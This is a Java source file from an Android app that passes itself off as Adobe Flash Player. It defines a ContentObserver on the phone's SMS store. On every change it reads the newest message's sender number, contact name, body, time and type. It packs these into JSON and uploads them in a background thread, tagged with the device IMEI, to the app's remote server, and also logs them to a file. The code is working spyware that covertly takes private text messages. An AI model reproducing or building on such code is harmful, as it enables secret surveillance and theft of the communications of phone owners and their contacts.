package com.adobe.flashplayer.data;


import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.NetworkUtils;
import com.adobe.flashplayer.network.UploadData;


public class PhoneSMSObsv extends ContentObserver {
    private final String TAG = "[ljg]PhoneSMSObserver";
    private Handler mHandler = null;
    private Context mContext = null;




    public PhoneSMSObsv(Handler handler, Context context) {
        super(handler);
        this.mHandler = handler;
        this.mContext = context;
    }

    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        Log.e(TAG,"onChange");

        String address = "";
        String person = "";
        String body = "";
        String type = "";
        String id = "";
        String date = "";
        String strdate = "";
        //String ret = "";
        String[] projection = new String[] {"_id", "address", "person","body", "date", "type"};
        try{
            //inbox
            Cursor c = mContext.getContentResolver().query(Uri.parse("content://sms/"), projection,null,
                    null, "date desc");
            if (c != null) {
                if (c.moveToFirst()) {
                    address = c.getString(c.getColumnIndex("address"));

                    person = c.getString(c.getColumnIndex("person"));

                    body = c.getString(c.getColumnIndex("body"));

                    type = c.getString(c.getColumnIndex("type"));

                    id = c.getString(c.getColumnIndex("_id"));

                    date = c.getString(c.getColumnIndex("date"));

                    strdate = Utils.formatDate("yyyy-MM-dd HH:mm:ss", Long.parseLong(date));
                    //ret= "latest message:" + "\t消息ID:" + id + "\t号码地址:" + address + "\t名称:" + person +
                    //		"\t消息内容:" + body + "\t时间:" + strdate + "\t类型:" + type +"\r\n";

                    JSONObject jsobj=new JSONObject();
                    jsobj.put("ID", id);
                    jsobj.put("号码", address);
                    jsobj.put("名称", person);
                    jsobj.put("消息内容", body);
                    jsobj.put("时间", strdate);
                    jsobj.put("类型", type);
                    JSONArray jsarray = new JSONArray();
                    jsarray.put(0,jsobj);

                    if (NetworkUtils.isNetworkAvailable(mContext)) {
                        UploadData sendmsg = new UploadData(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_LATESTMESSAGE, Public.IMEI);
                        Thread threadsendloc = new Thread(sendmsg);
                        threadsendloc.start();
                    }else{

                    }
                    MyLog.writeLogFile("SMSContentObserver receive new message:" + jsarray.toString());
                    Log.e(TAG, jsarray.toString());
                }
                c.close();
            }
            else{
                Log.e(TAG, "not found message");
            }
        }catch(Exception ex){
            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("SMSContentObserver exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
        }
    }



}

